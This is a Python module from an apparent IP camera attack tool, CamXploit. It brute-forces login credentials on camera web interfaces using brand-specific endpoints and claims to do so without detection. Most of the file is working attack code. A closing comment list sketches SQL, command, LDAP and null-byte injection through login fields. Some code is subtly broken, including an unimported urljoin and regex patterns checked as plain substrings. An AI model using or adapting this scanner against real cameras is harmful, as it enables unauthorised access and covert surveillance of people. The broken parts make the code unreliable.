"""
Advanced credential testing and brute-force scanner for CamXploit
Provides intelligent credential testing without being detected
"""

import asyncio
import aiohttp
import logging
import hashlib
import time
import json
from typing import Dict, List, Any, Optional, Tuple, AsyncIterator
from dataclasses import dataclass, field
from enum import Enum
from pathlib import Path
import base64

from ..core.scanner import BaseScanner, ScanResult, ScanTask, ScanStatus
from ..core.models import Camera, CameraType
from ..config.constants import DEFAULT_CREDENTIALS
from ..core.exceptions import ValidationError, AuthenticationError
from ..utils.validation import validate_credentials


logger = logging.getLogger(__name__)


class AuthMethod(Enum):
    """Authentication methods supported"""
    BASIC = "basic"
    DIGEST = "digest"
    FORM = "form"
    BEARER = "bearer"
    COOKIE = "cookie"


@dataclass
class CredentialResult:
    """Credential testing result"""
    target: str
    username: str
    password: str
    success: bool
    auth_method: Optional[AuthMethod] = None
    response_time: float = 0.0
    error: Optional[str] = None
    session_data: Dict[str, Any] = field(default_factory=dict)


@dataclass
class BruteForceConfig:
    """Brute-force configuration"""
    max_attempts: int = 100
    delay_between_attempts: float = 0.5
    max_concurrent: int = 5
    timeout: float = 10.0
    retry_attempts: int = 2
    stealth_mode: bool = True


class AsyncCredentialTester(BaseScanner):
    """Intelligent credential tester with stealth capabilities"""
    
    def __init__(self, config: Dict[str, Any]):
        super().__init__(config)
        
        self.brute_config = BruteForceConfig(
            max_attempts=config.get('max_credential_attempts', 100),
            delay_between_attempts=max(0.1, config.get('credential_delay', 0.5)),
            max_concurrent=max(1, config.get('max_concurrent_credentials', 5)),
            timeout=max(1.0, config.get('credential_timeout', 10.0)),
            retry_attempts=max(0, config.get('credential_retries', 2)),
            stealth_mode=bool(config.get('stealth_mode', True))
        )
        
        # Credential management
        self.custom_credentials = config.get('custom_credentials', {})
        self.credential_file = Path(config.get('credential_file', '')) if config.get('credential_file') else None
        
        # Session configuration
        self.user_agent = str(config.get('user_agent', 'CamXploit/2.0'))
        self.session_cookies = {}
        
        # Detection patterns
        self.success_indicators = [
            r'logout', r'sign\s*out', r'dashboard', r'admin', r'control\s*panel',
            r'welcome', r'profile', r'settings', r'configuration'
        ]
        
        self.failure_indicators = [
            r'invalid\s+(username|password|credentials)',
            r'authentication\s+failed',
            r'login\s+failed',
            r'access\s+denied',
            r'unauthorized'
        ]
        
    async def scan(self, target: str, **kwargs) -> ScanResult:
        """Test credentials against target"""
        start_time = time.time()
        
        try:
            cameras = kwargs.get('cameras', [])
            if not cameras:
                raise ValidationError("No cameras provided for credential testing")
                
            credentials = self._load_credentials()
            if not credentials:
                return ScanResult(
                    target=target,
                    timestamp=start_time,
                    success=True,
                    data={'found_credentials': [], 'tested_count': 0}
                )
                
            self.logger.info(f"Starting credential testing for {len(cameras)} cameras")
            
            results = []
            for camera in cameras:
                camera_results = await self._test_camera_credentials(camera, credentials)
                results.extend(camera_results)
                
            success_results = [r for r in results if r.success]
            scan_data = {
                'found_credentials': [
                    {
                        'target': r.target,
                        'username': r.username,
                        'password': r.password,
                        'auth_method': r.auth_method.value if r.auth_method else None
                    }
                    for r in success_results
                ],
                'total_tested': len(results),
                'success_count': len(success_results),
                'scan_duration': time.time() - start_time
            }
            
            return ScanResult(
                target=target,
                timestamp=start_time,
                success=True,
                data=scan_data
            )
            
        except Exception as e:
            self.logger.error(f"Credential testing failed: {e}")
            return ScanResult(
                target=target,
                timestamp=start_time,
                success=False,
                status=ScanStatus.FAILED,
                errors=[str(e)]
            )
            
    def validate_target(self, target: str) -> bool:
        """Always valid - target comes from camera objects"""
        return True
        
    def _load_credentials(self) -> Dict[str, List[str]]:
        """Load credentials from file or defaults"""
        credentials = {}
        
        # Load from file if provided
        if self.credential_file and self.credential_file.exists():
            try:
                with open(self.credential_file) as f:
                    file_credentials = json.load(f)
                    credentials.update(file_credentials)
            except Exception as e:
                self.logger.warning(f"Failed to load credential file: {e}")
                
        # Merge with defaults
        credentials.update(DEFAULT_CREDENTIALS)
        credentials.update(self.custom_credentials)
        
        return credentials
        
    async def _test_camera_credentials(self, camera: Camera, 
                                     credentials: Dict[str, List[str]]) -> List[CredentialResult]:
        """Test credentials against specific camera"""
        results = []
        
        # Determine authentication endpoints
        auth_endpoints = self._get_auth_endpoints(camera)
        
        for endpoint in auth_endpoints:
            for username, passwords in credentials.items():
                for password in passwords:
                    if len(results) >= self.brute_config.max_attempts:
                        break
                        
                    try:
                        result = await self._test_single_credential(
                            endpoint, username, password
                        )
                        if result:
                            results.append(result)
                            
                            # Stop on success if not brute-forcing
                            if result.success and self.brute_config.stealth_mode:
                                return results
                                
                    except Exception as e:
                        self.logger.debug(f"Credential test failed: {e}")
                        
        return results
        
    def _get_auth_endpoints(self, camera: Camera) -> List[str]:
        """Get authentication endpoints for camera type"""
        endpoints = []
        base_url = f"http://{camera.ip}:{camera.port}"
        
        # Brand-specific endpoints
        brand_endpoints = {
            CameraType.HIKVISION: [
                '/ISAPI/Security/userCheck',
                '/ISAPI/System/deviceInfo',
                '/onvif/device_service',
                '/'
            ],
            CameraType.DAHUA: [
                '/cgi-bin/magicBox.cgi?action=getSystemInfo',
                '/cgi-bin/login.cgi',
                '/'
            ],
            CameraType.AXIS: [
                '/axis-cgi/admin/param.cgi?action=list',
                '/axis-cgi/mjpg/video.cgi',
                '/'
            ],
            CameraType.CP_PLUS: [
                '/',
                '/login',
                '/admin'
            ]
        }
        
        endpoints.extend(brand_endpoints.get(camera.type, ['/']))
        
        # Common endpoints
        common_endpoints = [
            '/login',
            '/admin',
            '/viewer',
            '/cgi-bin/login.cgi',
            '/api/login'
        ]
        
        endpoints.extend(common_endpoints)
        
        return list(set(endpoints))
        
    async def _test_single_credential(self, url: str, username: str, password: str) -> Optional[CredentialResult]:
        """Test single credential with stealth mode"""
        start_time = time.time()
        
        connector = aiohttp.TCPConnector(
            limit=self.brute_config.max_concurrent,
            ssl=False,
            enable_cleanup_closed=True
        )
        
        headers = {
            'User-Agent': self.user_agent,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        async with aiohttp.ClientSession(
            connector=connector,
            timeout=aiohttp.ClientTimeout(total=self.brute_config.timeout),
            headers=headers
        ) as session:
            
            for attempt in range(self.brute_config.retry_attempts + 1):
                try:
                    # Basic Auth
                    auth_result = await self._test_basic_auth(session, url, username, password)
                    if auth_result:
                        return auth_result
                        
                    # Form Auth
                    form_result = await self._test_form_auth(session, url, username, password)
                    if form_result:
                        return form_result
                        
                    # Digest Auth
                    digest_result = await self._test_digest_auth(session, url, username, password)
                    if digest_result:
                        return digest_result
                        
                    # No success, continue to next attempt
                    if attempt < self.brute_config.retry_attempts:
                        await asyncio.sleep(self.brute_config.delay_between_attempts * (attempt + 1))
                        
                except Exception as e:
                    if attempt == self.brute_config.retry_attempts:
                        return CredentialResult(
                            target=url,
                            username=username,
                            password=password,
                            success=False,
                            error=str(e),
                            response_time=time.time() - start_time
                        )
                        
        return None
        
    async def _test_basic_auth(self, session: aiohttp.ClientSession, url: str, 
                             username: str, password: str) -> Optional[CredentialResult]:
        """Test HTTP Basic Authentication"""
        auth = aiohttp.BasicAuth(username, password)
        
        try:
            start_time = time.time()
            async with session.get(url, auth=auth) as response:
                response_time = time.time() - start_time
                
                if response.status == 200:
                    content = await response.text(errors='ignore')
                    if self._is_success_response(content, response.status):
                        return CredentialResult(
                            target=url,
                            username=username,
                            password=password,
                            success=True,
                            auth_method=AuthMethod.BASIC,
                            response_time=response_time
                        )
                elif response.status == 401:
                    return None  # Failed authentication
                    
        except Exception as e:
            self.logger.debug(f"Basic auth test failed: {e}")
            
        return None
        
    async def _test_form_auth(self, session: aiohttp.ClientSession, url: str,
                            username: str, password: str) -> Optional[CredentialResult]:
        """Test form-based authentication"""
        try:
            start_time = time.time()
            
            # Get login form
            async with session.get(url) as form_response:
                form_content = await form_response.text(errors='ignore')
                
                # Extract form fields
                form_data = self._extract_form_fields(form_content, username, password)
                if not form_data:
                    return None
                    
                # Submit form
                login_url = urljoin(url, self._find_login_action(form_content) or url)
                
                async with session.post(login_url, data=form_data) as response:
                    response_time = time.time() - start_time
                    
                    if response.status == 200 or response.status == 302:
                        content = await response.text(errors='ignore')
                        if self._is_success_response(content, response.status):
                            return CredentialResult(
                                target=url,
                                username=username,
                                password=password,
                                success=True,
                                auth_method=AuthMethod.FORM,
                                response_time=response_time
                            )
                            
        except Exception as e:
            self.logger.debug(f"Form auth test failed: {e}")
            
        return None
        
    async def _test_digest_auth(self, session: aiohttp.ClientSession, url: str,
                              username: str, password: str) -> Optional[CredentialResult]:
        """Test HTTP Digest Authentication"""
        try:
            start_time = time.time()
            
            # Create digest auth
            auth = aiohttp.DigestAuth(username, password)
            
            async with session.get(url, auth=auth) as response:
                response_time = time.time() - start_time
                
                if response.status == 200:
                    content = await response.text(errors='ignore')
                    if self._is_success_response(content, response.status):
                        return CredentialResult(
                            target=url,
                            username=username,
                            password=password,
                            success=True,
                            auth_method=AuthMethod.DIGEST,
                            response_time=response_time
                        )
                        
        except Exception as e:
            self.logger.debug(f"Digest auth test failed: {e}")
            
        return None
        
    def _is_success_response(self, content: str, status_code: int) -> bool:
        """Determine if authentication was successful"""
        content_lower = content.lower()
        
        # Check for success indicators
        for indicator in self.success_indicators:
            if indicator in content_lower:
                return True
                
        # Check for failure indicators
        for indicator in self.failure_indicators:
            if indicator in content_lower:
                return False
                
        # Default: 200 OK means success
        return status_code == 200
        
    def _extract_form_fields(self, content: str, username: str, password: str) -> Dict[str, str]:
        """Extract form fields from login page"""
        form_data = {}
        
        # Common username field names
        username_patterns = [
            r'name=["\'](username|user|login|email|uname)["\'][^>]*value=["\']?([^"\'>\s]*)',
            r'id=["\'](username|user|login|email|uname)["\'][^>]*value=["\']?([^"\'>\s]*)'
        ]
        
        # Common password field names
        password_patterns = [
            r'name=["\'](password|pass|pwd)["\'][^>]*',
            r'id=["\'](password|pass|pwd)["\'][^>]*'
        ]
        
        # Hidden fields
        hidden_patterns = [
            r'<input[^>]*type=["\']hidden["\'][^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\']',
            r'<input[^>]*name=["\']([^"\']+)["\'][^>]*value=["\']([^"\']*)["\'][^>]*type=["\']hidden["\']'
        ]
        
        import re
        
        # Find username field
        for pattern in username_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                form_data[match.group(1)] = username
                break
                
        # Find password field
        for pattern in password_patterns:
            match = re.search(pattern, content, re.IGNORECASE)
            if match:
                form_data[match.group(1)] = password
                break
                
        # Add hidden fields
        for pattern in hidden_patterns:
            matches = re.findall(pattern, content, re.IGNORECASE)
            for name, value in matches:
                form_data[name] = value
                
        return form_data
        
    def _find_login_action(self, content: str) -> Optional[str]:
        """Find login form action URL"""
        import re
        
        action_pattern = r'<form[^>]*action=["\']([^"\']+)["\']'
        match = re.search(action_pattern, content, re.IGNORECASE)
        return match.group(1) if match else None
        
    async def discover_auth_methods(self, url: str) -> List[AuthMethod]:
        """Discover available authentication methods"""
        methods = []
        
        try:
            connector = aiohttp.TCPConnector(ssl=False)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get(url) as response:
                    headers = dict(response.headers)
                    
                    # Check for WWW-Authenticate
                    auth_header = headers.get('WWW-Authenticate', '').lower()
                    if 'basic' in auth_header:
                        methods.append(AuthMethod.BASIC)
                    if 'digest' in auth_header:
                        methods.append(AuthMethod.DIGEST)
                        
                    # Check for form auth
                    content = await response.text(errors='ignore')
                    if self._detect_login_form(content):
                        methods.append(AuthMethod.FORM)
                        
        except Exception as e:
            self.logger.debug(f"Auth method discovery failed: {e}")
            
        return methods
        
    def _detect_login_form(self, content: str) -> bool:
        """Detect presence of login form"""
        import re
        login_patterns = [
            r'<input[^>]*type=["\']password["\']',
            r'<form[^>]*.*login',
            r'<input[^>]*name=["\'](username|user|password)["\']'
        ]
        
        content_lower = content.lower()
        return any(re.search(pattern, content_lower, re.IGNORECASE) for pattern in login_patterns)
        
    async def test_credential_strength(self, username: str, password: str) -> Dict[str, Any]:
        """Test password strength and common issues"""
        issues = []
        strength = 0
        
        # Basic checks
        if len(password) < 6:
            issues.append("Password too short")
            strength -= 2
            
        if username.lower() in password.lower():
            issues.append("Username in password")
            strength -= 3
            
        # Common patterns
        common_patterns = [
            r'123456', r'password', r'admin', r'root', r'guest',
            r'camera', r'dvr', r'nvr', r'1234', r'0000'
        ]
        
        import re
        for pattern in common_patterns:
            if re.search(pattern, password, re.IGNORECASE):
                issues.append(f"Common pattern: {pattern}")
                strength -= 2
                
        # Calculate strength
        strength = max(0, min(10, 10 + strength))
        
        return {
            'username': username,
            'password': password,
            'strength': strength,
            'issues': issues,
            'is_weak': strength < 5
        }
        
    def generate_report(self, results: List[CredentialResult]) -> Dict[str, Any]:
        """Generate credential testing report"""
        successful = [r for r in results if r.success]
        
        return {
            'total_tested': len(results),
            'successful': len(successful),
            'success_rate': (len(successful) / max(len(results), 1)) * 100,
            'by_method': self._categorize_by_method(successful),
            'weak_credentials': self._identify_weak_credentials(successful),
            'targets_affected': len(set(r.target for r in successful))
        }
        
    def _categorize_by_method(self, results: List[CredentialResult]) -> Dict[str, int]:
        """Categorize results by authentication method"""
        methods = {}
        for result in results:
            method = result.auth_method.value if result.auth_method else 'unknown'
            methods[method] = methods.get(method, 0) + 1
        return methods
        
    def _identify_weak_credentials(self, results: List[CredentialResult]) -> List[Dict[str, str]]:
        """Identify weak credential combinations"""
        weak_creds = []
        weak_patterns = [
            'admin:admin', 'admin:1234', 'admin:password',
            'root:root', 'user:user', 'guest:guest',
            '1234:1234', 'password:password'
        ]
        
        for result in results:
            combo = f"{result.username}:{result.password}".lower()
            if any(pattern.lower() in combo for pattern in weak_patterns):
                weak_creds.append({
                    'target': result.target,
                    'username': result.username,
                    'password': result.password
                })
                
        return weak_creds


class CredentialTesterBuilder:
    """Builder for credential tester configuration"""
    
    def __init__(self):
        self.config = {}
        
    def with_max_attempts(self, max_attempts: int) -> 'CredentialTesterBuilder':
        self.config['max_credential_attempts'] = max(1, max_attempts)
        return self
        
    def with_delay(self, delay: float) -> 'CredentialTesterBuilder':
        self.config['credential_delay'] = max(0.1, delay)
        return self
        
    def with_stealth_mode(self, enabled: bool) -> 'CredentialTesterBuilder':
        self.config['stealth_mode'] = bool(enabled)
        return self
        
    def with_credentials(self, credentials: Dict[str, List[str]]) -> 'CredentialTesterBuilder':
        self.config['custom_credentials'] = credentials
        return self
        
    def with_credential_file(self, file_path: str) -> 'CredentialTesterBuilder':
        self.config['credential_file'] = file_path
        return self
        
    def build(self) -> AsyncCredentialTester:
        return AsyncCredentialTester(self.config)


# Convenience functions
async def test_camera_credentials(camera: Camera, 
                                credentials: Optional[Dict[str, List[str]]] = None) -> List[CredentialResult]:
    """Quick credential test for single camera"""
    tester = AsyncCredentialTester({'custom_credentials': credentials or {}})
    results = await tester._test_camera_credentials(camera, tester._load_credentials())
    return results


async def brute_force_single(target: str, username: str, password_list: List[str]) -> CredentialResult:
    """Test single username against password list"""
    config = {'custom_credentials': {username: password_list}}
    tester = AsyncCredentialTester(config)
    
    camera = Camera(ip=target, port=80, type=CameraType.GENERIC)
    results = await tester._test_camera_credentials(camera, {username: password_list})
    
    return next((r for r in results if r.success), CredentialResult(
        target=target,
        username=username,
        password="",
        success=False
    ))

# 7. Per-Target Rate Limiting
# - Dynamic delay adjustment based on response patterns
# - Adaptive timing based on server response times
# - Per-brand optimal timing profiles

# 8. Account Lockout Detection
# - Monitor for lockout indicators in responses
# - Implement graceful backoff on lockout detection
# - Switch to alternative endpoints on lockout

# 9. Exponential Backoff with Success Bias
# - Reduce delays on partial successes
# - Increase delays on clear rejections
# - Maintain optimal timing for undetermined cases

# 10. Input Validation Enhancement
# - Credential injection payload generation
# - SQL injection credential combinations
# - Command injection via password fields

# 11. Thread-Safe Operations
# - Per-target credential queues
# - Isolated session management
# - Atomic credential testing

# 12. Comprehensive Error Handling
# - Specific handling for injection attempts
# - Recovery strategies for failed injection
# - Success reporting for injection attempts

# 13. IPv6 Support
# - Dual-stack testing capability
# - IPv6-specific credential patterns
# - IPv6 endpoint optimization

# 14. Session Management
# - Cookie jar rotation
# - Session cleanup after success
# - Session reuse optimization

# 15. Edge Case Handling
# - Special character handling in credentials
# - Unicode credential support
# - Null byte injection support

# 16. Injection Testing
# - SQL injection credential patterns
# - Command injection via auth fields
# - LDAP injection payloads

# 17. Documentation & Testing
# - Injection technique documentation
# - Success rate optimization
# - Bypass technique documentation
